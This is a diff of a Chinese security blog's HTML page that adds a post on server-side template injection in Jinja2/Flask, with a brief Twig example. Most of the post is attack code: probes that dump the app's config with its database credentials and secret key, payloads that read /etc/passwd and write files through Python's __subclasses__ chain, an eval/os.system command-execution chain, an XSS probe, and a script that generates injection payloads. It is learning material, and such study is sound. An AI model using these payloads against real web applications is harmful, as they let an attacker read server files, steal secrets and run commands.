@@ -22,7 +22,7 @@
     <meta name="description" content>
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>xiaomeiqiu&#39;s Studio</title>
+    <title>python-模板注入 · xiaomeiqiu&#39;s Studio</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -77,6 +77,8 @@
 
     <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
     <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
     
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
@@ -201,14 +203,23 @@
 </head>
 
     
-        <body class="home-body">
+        <body class="post-body">
     
     
-<header class="header index-header">
+<header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">xiaomeiqiu&#39;s Studio.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">python-模板注入</a>
+            </div>
+    </div>
     
     <a class="home-link" href="/">xiaomeiqiu's Studio.</a>
 </header>
@@ -227,17 +238,17 @@ height:50vh;
     <!-- 主页  -->
     
     
-    <!-- 文章页  -->
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/index-bg.jpg)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            xiaomeiqiu's Studio.
-            <!-- 文章页  -->
+            python-模板注入
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
@@ -245,12 +256,43 @@ height:50vh;
             <!-- 主页副标题  -->
             
             
-                Life is fantastic
-            
-            <!-- 文章页  -->
+            <!-- 404 -->
             
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">1.8k</span>阅读时长: <span class="post-count reading-time">9 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/11/21</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -351,395 +393,160 @@ height:50vh;
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/01/30/XXE攻击/">
-            
-                <span>XXE攻击</span>
-        </a>
-        <div class="abstract-content">
-            <h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a><strong>介绍</strong></h1><p>现在越来越多主要的web程序被发现和报告存在XXE（XML外部实体攻击）漏洞，比如说facebook，paypal等等。举个例子，我们扫一眼这些网站最近奖励的漏洞，充分证实了前面的说法。尽管XXE漏洞已经存在了很多年，但是它从来没有获得它应得的关注度。很多XML的解析器默认是含有XXE漏洞的，这意味着开发人员有责任确保这些程序不受此漏洞的影响。<br>
-        </p></div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/01/30</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="XXE">XXE</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="CTF">CTF</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/01/18/python-flaslk-web/">
-            
-                <span>Python-Flask-小项目</span>
-        </a>
-        <div class="abstract-content">
-            <h2 id="前言-："><a href="#前言-：" class="headerlink" title="[前言]："></a>[前言]：</h2><p>前些日子用python开发了一个简单的留言班，最后一个月学业繁忙忘了整理记录一波。今天整理温习一波，视频是参考b站上的大佬的，b站真是无所不能呀。<br>
-        </p></div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/01/18</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="FLASK">FLASK</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="WEB">WEB</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2018/11/21/python-inject/">
-            
-                <span>python-模板注入</span>
-        </a>
-        <div class="abstract-content">
-            [前言]：最近突然有些疲惫，闲着我就去做一个小小开发，开发之后发现自己用的是jinj2。尝试一波sql注入，果然写好的框架不是这么好日的。接下来学习了下模板注入。
-[正文]：1.产生该漏洞的原因：程序猿设计问题让模板的变量可控。跟sql注入的原理差不多。程序员自己的疏忽！
-2.利用的条件：1.是利用jinja2，或者其他模板开发的。 2.模板中的部分变量，代码用户可控。
-3.常见的利用点：1.jinja2中的render_template_string，进行渲染字符串为模板的时候。示例代码如下：
-@app.errorhandler(404)
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="前言-："><a href="#前言-：" class="headerlink" title="[前言]："></a>[前言]：</h2><p>最近突然有些疲惫，闲着我就去做一个小小开发，开发之后发现自己用的是jinj2。尝试一波sql注入，果然写好的框架不是这么好日的。接下来学习了下模板注入。</p>
+<h2 id="正文-："><a href="#正文-：" class="headerlink" title="[正文]："></a>[正文]：</h2><h4 id="1-产生该漏洞的原因："><a href="#1-产生该漏洞的原因：" class="headerlink" title="1.产生该漏洞的原因："></a>1.产生该漏洞的原因：</h4><p>程序猿设计问题让模板的变量可控。跟sql注入的原理差不多。程序员自己的疏忽！</p>
+<h4 id="2-利用的条件："><a href="#2-利用的条件：" class="headerlink" title="2.利用的条件："></a>2.利用的条件：</h4><p>1.是利用jinja2，或者其他模板开发的。 2.模板中的部分变量，代码用户可控。</p>
+<h4 id="3-常见的利用点："><a href="#3-常见的利用点：" class="headerlink" title="3.常见的利用点："></a>3.常见的利用点：</h4><p>1.jinja2中的render_template_string，进行渲染字符串为模板的时候。示例代码如下：</p>
+<pre><code>@app.errorhandler(404)
 def page_not_found(e):
-...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/11/21</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2018/11/14/python-flask-web-base/">
-            
-                <span>Python-flask-web基础</span>
-        </a>
-        <div class="abstract-content">
-            [Flask开发准备]：Python虚拟环境介绍与安装：因为python的版本更新的太快，flask的版本不兼容，一个虚拟环境对应一个falsk，就可以解决这个问题。
+    template = &apos;&apos;&apos;{%% extends "base.html" %%}
+{%% block main %%}
+    &lt;div class=&quot;center-content error&quot;&gt;
+        &lt;h1&gt;Oops! That page doesn&apos;t exist.&lt;/h1&gt;
+        &lt;h3&gt;%s&lt;/h3&gt;
+    &lt;/div&gt;
+{%% endblock %%}
+&apos;&apos;&apos; % (request.url)
+    return render_template_string(template)
+</code></pre><p>在进行处理404的时候，渲染请求的url。可能会出现ssti注入。 验证漏洞</p>
+<pre><code>http://127.0.0.1:5000/login/dsadasd{ {config}}
+</code></pre><p>得到结果，拿到config的信息</p>
+<pre><code>http://127.0.0.1:5000/login/dsadasd&lt;Config {&apos;JSON_AS_ASCII&apos;: True, &apos;SESSION_REFRESH_EACH_REQUEST&apos;: True, &apos;PASSWORD&apos;: &apos;root&apos;, &apos;SQLALCHEMY_POOL_RECYCLE&apos;: None, &apos;USERNAME&apos;: &apos;root&apos;, &apos;SQLALCHEMY_TRACK_MODIFICATIONS&apos;: False, &apos;SQLALCHEMY_POOL_TIMEOUT&apos;: None, &apos;SQLALCHEMY_RECORD_QUERIES&apos;: None, &apos;SESSION_COOKIE_DOMAIN&apos;: False, &apos;SESSION_COOKIE_NAME&apos;: &apos;session&apos;, &apos;MAX_COOKIE_SIZE&apos;: 4093, &apos;SQLALCHEMY_NATIVE_UNICODE&apos;: None, &apos;MAX_CONTENT_LENGTH&apos;: None, &apos;DATABASE&apos;: &apos;desc&apos;, &apos;HOSTNAME&apos;: &apos;127.0.0.1&apos;, &apos;PERMANENT_SESSION_LIFETIME&apos;: datetime.timedelta(31), &apos;SQLALCHEMY_POOL_SIZE&apos;: None, &apos;SQLALCHEMY_MAX_OVERFLOW&apos;: None, &apos;TRAP_HTTP_EXCEPTIONS&apos;: False, &apos;PRESERVE_CONTEXT_ON_EXCEPTION&apos;: None, &apos;SQLALCHEMY_ECHO&apos;: False, &apos;SESSION_COOKIE_PATH&apos;: None, &apos;SESSION_COOKIE_SAMESITE&apos;: None, &apos;PROPAGATE_EXCEPTIONS&apos;: None, &apos;SECRET_KEY&apos;: &apos;\xf8%k\x04\x99Y\xa8J\x0f\xd4\xd9,\x87%/\x98j\x8b\x06\x83\xe5&quot;\x03\xfd&apos;, &apos;PORT&apos;: &apos;3306&apos;, &apos;APPLICATION_ROOT&apos;: &apos;/&apos;, &apos;SERVER_NAME&apos;: None, &apos;PREFERRED_URL_SCHEME&apos;: &apos;http&apos;, &apos;TESTING&apos;: False, &apos;TEMPLATES_AUTO_RELOAD&apos;: None, &apos;JSONIFY_MIMETYPE&apos;: &apos;application/json&apos;, &apos;USE_X_SENDFILE&apos;: False, &apos;SQLALCHEMY_DATABASE_URI&apos;: &apos;mysql+mysqldb://root:root@127.0.0.1:3306/desc?charset=utf8&apos;, &apos;SESSION_COOKIE_SECURE&apos;: False, &apos;SQLALCHEMY_BINDS&apos;: None, &apos;ENV&apos;: &apos;production&apos;, &apos;DEBUG&apos;: True, &apos;SQLALCHEMY_COMMIT_ON_TEARDOWN&apos;: False, &apos;EXPLAIN_TEMPLATE_LOADING&apos;: False, &apos;JSONIFY_PRETTYPRINT_REGULAR&apos;: False, &apos;DB_URL&apos;: &apos;mysql+mysqldb://root:root@127.0.0.1:3306/desc?charset=utf8&apos;, &apos;TRAP_BAD_REQUEST_ERRORS&apos;: None, &apos;JSON_SORT_KEYS&apos;: True, &apos;SESSION_COOKIE_HTTPONLY&apos;: True, &apos;SEND_FILE_MAX_AGE_DEFAULT&apos;: datetime.timedelta(0, 43200)}&gt;
+</code></pre><p>收集其他大表哥的示例发现利用思路都是一样的</p>
+<pre><code>#python3
+#Flask version:0.12.2
+#Jinja2: 2.10
+from flask import Flask, request
+from jinja2 import Template
+app = Flask(__name__)
+@app.route(&quot;/&quot;)
+def index():
+    name = request.args.get(&apos;name&apos;, &apos;guest&apos;)
+    t = Template(&quot;Hello &quot; + name)
+    return t.render()
+if __name__ == &quot;__main__&quot;:
+    app.run();
+</code></pre><p>漏洞利用</p>
+<pre><code>http://127.0.0.1:5000/?name={ {2*3}}
+</code></pre><p>2.不光是python框架，在php中的Twig，如果防范不当也有可能被利用比如</p>
+<pre><code>&lt;?php
+require_once dirname(__FILE__).&apos;/../lib/Twig/Autoloader.php&apos;;
+Twig_Autoloader::register(true);
 
-安装虚拟环境：pip install virtualevn
+$twig = new Twig_Environment(new Twig_Loader_String());
+$output = $twig-&gt;render(&quot;Hello {$_GET[&apos;name&apos;]}&quot;);  // 将用户输入作为模版内容的一部分
+echo $output;
+</code></pre><p>利用方式:xss</p>
+<pre><code>?name=&lt;script&gt;alter(1);&lt;/script&gt;
+</code></pre><p>等模板框架使用不当情况下</p>
+<h4 id="4-常见的利用的poc"><a href="#4-常见的利用的poc" class="headerlink" title="4.常见的利用的poc"></a>4.常见的利用的poc</h4><pre><code>#注入变量执行命令详见 http://www.freebuf.com/articles/web/98928.html
+#读文件：
+{ { &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/etc/passwd&apos;).read() }}
+#写文件：
+{ { &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/tmp/1&apos;).write(&quot;&quot;) }}
+</code></pre><p>这些利用方式到底是什么意思我们来探索下。 python中有内置的函数，还有内建属性。什么是内建变量，很简单我们打印输出下</p>
+<pre><code>&gt;&gt;&gt; print(vars())
+{&apos;__builtins__&apos;: &lt;module &apos;__builtin__&apos; (built-in)&gt;, &apos;__name__&apos;: &apos;__main__&apos;, &apos;__doc__&apos;: None, &apos;__package__&apos;: None}
+</code></pre><p>其中最主要的就是这个__name__。__name__是一个变量。前后加了双下划线是因为是因为这是系统定义的名字。普通变量不要使用此方式命名变量。 因为python所有的类都继承自于object类。一些内置的属性以及方法就存在于所有的方法中。我们可以通过这些内置属性，方法来配合注入来达到命令执行。 这里我们来分析{ { ‘’.__class__.__mro__[2].__subclasses__()[40](‘/etc/passwd’).read() }}构成读写文件。</p>
+<pre><code>&apos; &apos;代表字符串，字符串string类
+__class__返回当前得类
+__mro__寻找基类时参考类,返回的字典类型,[2]第二个值object
+__subclasses__()返会子类
+</code></pre><p>分析到这里我们已经找到所有类的子类。 然后所有的函数都有个__globals__属性，并且这个属性下中会包括引入了的modules同时每个python脚本都会自动加载 builtins 这个模块，而且这个模块包括了很多强大的built-in 函数，例如eval, exec, open等等。那我们的目标就很明确找到object类然后，在下面找到其中一个没有被重载的方法，然后利用__globals__属性，下面的函数，执行命令。借用下大佬的寻找过程</p>
+<pre><code>#python3
+#__class__返回调用的参数类型
+#__base__返回基类
+#__mro__寻找基类时参考类
+#__sublclasses__()返回子类
+#获得 object 类的子类
+&gt;&gt;&gt; &apos;&apos;.__class__.__base__.__subclasses__()
+[&lt;class &apos;str_iterator&apos;&gt;, &lt;class &apos;mappingproxy&apos;&gt;, &lt;class &apos;idlelib.AutoComplete.AutoComplete&apos;&gt;, &lt;class &apos;pydoc.ModuleScanner&apos;&gt;, &lt;class &apos;contextlib.ContextDecorator&apos;&gt;, &lt;class &apos;textwrap.TextWrapper&apos;&gt;, &lt;class &apos;socketserver.ThreadingMixIn&apos;&gt;, &lt;class &apos;_tkinter.tktimertoken&apos;&gt;, ...]
+#从中随便选一个类,查看它的__init__
+&gt;&gt;&gt; &apos;&apos;.__class__.__base__.__subclasses__()[30].__init__
+&lt;slot wrapper &apos;__init__&apos; of &apos;object&apos; objects&gt;
+# wrapper是指这些函数并没有被重载，这时他们并不是function，不具有__globals__属性
+&gt;&gt;&gt; &apos;&apos;.__class__.__base__.__subclasses__()[30].__init__.__globals__
+Traceback (most recent call last):
+  File &quot;&lt;pyshell#8&gt;&quot;, line 1, in &lt;module&gt;
+    &apos;&apos;.__class__.__base__.__subclasses__()[30].__init__.__globals__
+AttributeError: &apos;wrapper_descriptor&apos; object has no attribute &apos;__globals__&apos;
+#再换几个子类，很快就能找到一个重载过__init__的类，比如
+&gt;&gt;&gt; &apos;&apos;.__class__.__base__.__subclasses__()[5].__init__
+&lt;function TarFile.__init__ at 0x0000019D685A8158&gt;
+&gt;&gt;&gt; &apos;&apos;.__class__.__base__.__subclasses__()[5].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;]
+&lt;built-in function eval&gt;
+#然后用eval执行命令即可
+test.__globals__[&apos;__builtins__&apos;].eval(&quot;__import__(&apos;os&apos;).system(&apos;dir&apos;)&quot;)
+</code></pre><p>其中寻找function的过程可以用一个小脚本解决, 脚本找到被重载过的function，然后组成payload（借大佬的）</p>
+<pre><code>#!/usr/bin/python3
+# coding=utf-8
+# python 3.5
+from flask import Flask
+from jinja2 import Template
+# Some of special names
+searchList = [&apos;__init__&apos;, &quot;__new__&quot;, &apos;__del__&apos;, &apos;__repr__&apos;, &apos;__str__&apos;, &apos;__bytes__&apos;, &apos;__format__&apos;, &apos;__lt__&apos;, &apos;__le__&apos;, &apos;__eq__&apos;, &apos;__ne__&apos;, &apos;__gt__&apos;, &apos;__ge__&apos;, &apos;__hash__&apos;, &apos;__bool__&apos;, &apos;__getattr__&apos;, &apos;__getattribute__&apos;, &apos;__setattr__&apos;, &apos;__dir__&apos;, &apos;__delattr__&apos;, &apos;__get__&apos;, &apos;__set__&apos;, &apos;__delete__&apos;, &apos;__call__&apos;, &quot;__instancecheck__&quot;, &apos;__subclasscheck__&apos;, &apos;__len__&apos;, &apos;__length_hint__&apos;, &apos;__missing__&apos;,&apos;__getitem__&apos;, &apos;__setitem__&apos;, &apos;__iter__&apos;,&apos;__delitem__&apos;, &apos;__reversed__&apos;, &apos;__contains__&apos;, &apos;__add__&apos;, &apos;__sub__&apos;,&apos;__mul__&apos;]
+neededFunction = [&apos;eval&apos;, &apos;open&apos;, &apos;exec&apos;]
+pay = int(input(&quot;Payload?[1|0]&quot;))
+for index, i in enumerate({}.__class__.__base__.__subclasses__()):
+    for attr in searchList:
+        if hasattr(i, attr):
+            if eval(&apos;str(i.&apos;+attr+&apos;)[1:9]&apos;) == &apos;function&apos;:
+                for goal in neededFunction:
+                    if (eval(&apos;&quot;&apos;+goal+&apos;&quot; in i.&apos;+attr+&apos;.__globals__[&quot;__builtins__&quot;].keys()&apos;)):
+                        if pay != 1:
+                            print(i.__name__,&quot;:&quot;, attr, goal)
+                        else:
+                            print(&quot;{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='" + i.__name__ + "' %}{ { c." + attr + ".__globals__['__builtins__']." + goal + "(\"[evil]\") }}{% endif %}{% endfor %}&quot;)
+</code></pre><p>然后用什么库导入什么库，然后就会输出payload 最后附上学习连接 基本学习连接 <a href="https://blog.csdn.net/qq_27446553/article/details/79379136" target="_blank" rel="noopener">https://blog.csdn.net/qq_27446553/article/details/79379136</a> freebuf关于ssti注入：<a href="https://www.freebuf.com/articles/web/98928.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/98928.html</a> ph0大佬 过于绕过过滤：<a href="https://p0sec.net/index.php/archives/120/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/120/</a></p>
 
-将虚拟环境安装到指定目录：virtualevn flask-evn
-
-激活flask ：进入安装的目录进入Scripts 输入active
-
-在虚拟环境中安装flask：pip install flask
-
-
-Pycharm的使用：创建一个新项目：选择刚才创建环境中的/bin/python.exe。也可以让pycharm自己创建一个flask虚拟环境
-第一个f...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/11/14</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
     </article>
+    <!-- license  -->
     
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2018/11/07/java-web/">
-            
-                <span>JAVA-WEB-开发</span>
-        </a>
-        <div class="abstract-content">
-            [前言]：最近写java作业老师要检查，那不能白白的浪费时间记录下自己开发学习过程，最后做个能看的javaweb项目。前端的就随便找个框架填上算了。
-[正文]：1.SERVERLET1.1 SERVERLET简介:
-
-Serverlet是位于Web服务器内部的，服务端的，独立于平台和协议的java应用程序，可以生成动态的web。
-Servlet是一个可信赖的程序，不受java安全性的控制，拥有和普通java应用程序一样的权限。
-Servlet是CGI Script的一种替代技术，由于Servlet在性能、可移植性、代码重用等方面比CGI具有显著的优势，因此在未来的技术发展过程中，Serv...
+        <div class="license-wrapper">
+            <p>原文作者：<a href="23.105.208.131">xiaomeiqiu</a>
+            </p><p>原文链接：<a href="23.105.208.131/2018/11/21/python-inject/">23.105.208.131/2018/11/21/python-inject/</a>
+            </p><p>发表日期：<a href="23.105.208.131/2018/11/21/python-inject/">十一月 21日 2018, 11:01:33 晚上</a>
+            </p><p>更新日期：<a href="23.105.208.131/2018/11/21/python-inject/">January 29th 2019, 4:56:02 pm</a>
+            </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/11/07</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2018/11/06/网鼎杯-fakebook/">
-            
-                <span>网鼎杯第一场web_write_up</span>
-        </a>
-        <div class="abstract-content">
-            [前言]:最前看了上海的比赛自闭了，准备最近好好复现下近些天比赛的题目。首先从网鼎杯第一场开始。
-[正文]：题目：FAKEBOOK 题目文件：链接：https://pan.baidu.com/s/1enihLDFa9JnLJ1eG_ZcK6Q 密码：j6hh 扫一扫出来个user.php.bak（原谅我字典没扫到）还有个flag.php，然后得到user.php的代码。得到的代码如下。目前用不到接着往下做
-1234567891011121314151617181920212223242526272829303132333435363738394041class UserInfo&#123...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/11/06</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2018/09/05/序列化/">
-            
-                <span>序列化与反序列化简单-晋级</span>
-        </a>
-        <div class="abstract-content">
-            序列化:把复杂的数据类型压缩到一个字符串中 数据类型可以是数组，字符串，对象等  函数 : serialize() 反序列化:恢复原先被序列化的变量 函数: unserialize()
-&lt;?php
-class QRQ{
-    public $data;
-    private $pass;
-    private $qrq=&quot;dasdasdas&quot;;
-    public $cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;SAAB&quot;);
-    public $age=array(&quot;Pet...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/09/05</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2018/08/13/little-muma/">
-            
-                <span>ISCC国赛-一句话木马分析</span>
-        </a>
-        <div class="abstract-content">
-            [前言]：北京iscc回来之后还没来得及时总结，比赛结果还是不错的国赛二等奖可以吹会了。但是更多的是收获，这次比赛发现web狗真是没法活下去了，比赛的web难的一批。除了第一个web我们做出来了，其他的我竟然都没扫描出来有高端口。。好像是6千几来着，回头复现下那个环境。第一个做出来也是千辛万苦呀，还是太菜，web狗表示打不动。应该有好多人看到一句话木马都没打动。真是这越来越难了，pwn大佬就是6上来干俩pwn虐爆全场，就在我们后面（每次好像都是），大佬在身后，萌新瑟瑟发抖。刚开始刷分的时候，基本上没几个得分的。本来想删他们的一句话木马，但是由于自己技术不熟练没种上，急于开心的刷flag没...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/08/13</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="php单双引号">php单双引号</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="木马">木马</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2018/06/10/2018西普杯铁人三项河南赛区（数据分析赛）/">
-            
-                <span>2018西普杯铁人三项河南赛区（数据分析赛）</span>
-        </a>
-        <div class="abstract-content">
-            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>首先说下踩坑经历。第一次参加这种综合性比赛、数据赛、个人赛（主要是pwn）、企业赛，看到pwn没办法我们只能对他说再见（从头到尾连看都没看）。看似是一道文件上传题，n种姿势上传都失败，查看上传的文件发现什~$msf.doc、~$office.doc、……
-        </p></div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/06/10</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="流量分析">流量分析</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2018/04/08/SQL注入-Oderby注入/">
-            
-                <span>SQL注入-order by 注入</span>
-        </a>
-        <div class="abstract-content">
-            ##SQL注入-ORDERBY注入
-1，后台登录代码如下：123456789101112131415161718$username = $_POST['username'];$password = $_POST['password'];if(filter($username))&#123;    //过滤括号&#125;else&#123;    $sql="SELECT * FROM admin WHERE username='".$username."'";    $result=mysql_query($sql);    @$row = mysql_fetch_array($res...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/04/08</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
     
     <!-- paginator  -->
-    
-</main>
-            <!-- profile -->
+    <ul class="post-paginator">
+        <li class="next">
             
-            <div class="profile">
-    <img class="profile-avatar" alt="avatar" src="https://raw.githubusercontent.com/xiaomeiqiu007/warm-photos/master/timg.jpg">
-    <div class="profile-name">xiaomeiqiu</div>
-    
-    <div class="profile-signature">
-        witness me
-    </div>
-    
-    
-    <div class="profile-social">
-        
-    
-        
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2019/01/18/python-flaslk-web/" title="Python-Flask-小项目">
+                    <div class="nextTitle">Python-Flask-小项目</div>
+                </a>
             
-                <a href="mailto:1870977163@qq.com" class="iconfont-archer email" title="email"></a>
+        </li>
+        <li class="previous">
             
-        
-    
-        
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2018/11/14/python-flask-web-base/" title="Python-flask-web基础">
+                    <div class="prevTitle">Python-flask-web基础</div>
+                </a>
             
-                <a href="//github.com/xiaomeiqiu007" class="iconfont-archer github" target="_blank" title="github"></a>
-            
-        
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
-        
     
-        
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
     
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
     
 
-    </div>
-    
-    
-        <div class="friends">
-            <div>FRIENDS</div>
-            
-                
-                    <span>
-                        <a href="//www.lybsec.top" target="_black">friendA</a>
-                    </span>
-                
-            
-                
-                    <span>
-                        <a href="//www.77sec.cn" target="_black">friendB</a>
-                    </span>
-                
-            
-                
-            
-        </div>
-    
-    
-        <div class="about-me">
-            <a href="/about">ABOUT ME</a>
-        </div>
-    
-</div>
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
             
         </div>
         <footer class="footer footer-unloaded">
@@ -815,6 +622,24 @@ class QRQ{
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言-："><span class="toc-number">1.</span> <span class="toc-text">[前言]：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文-："><span class="toc-number">2.</span> <span class="toc-text">[正文]：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-产生该漏洞的原因："><span class="toc-number">2.0.1.</span> <span class="toc-text">1.产生该漏洞的原因：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-利用的条件："><span class="toc-number">2.0.2.</span> <span class="toc-text">2.利用的条件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-常见的利用点："><span class="toc-number">2.0.3.</span> <span class="toc-text">3.常见的利用点：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-常见的利用的poc"><span class="toc-number">2.0.4.</span> <span class="toc-text">4.常见的利用的poc</span></a></li></ol></li></ol></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -1111,6 +936,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
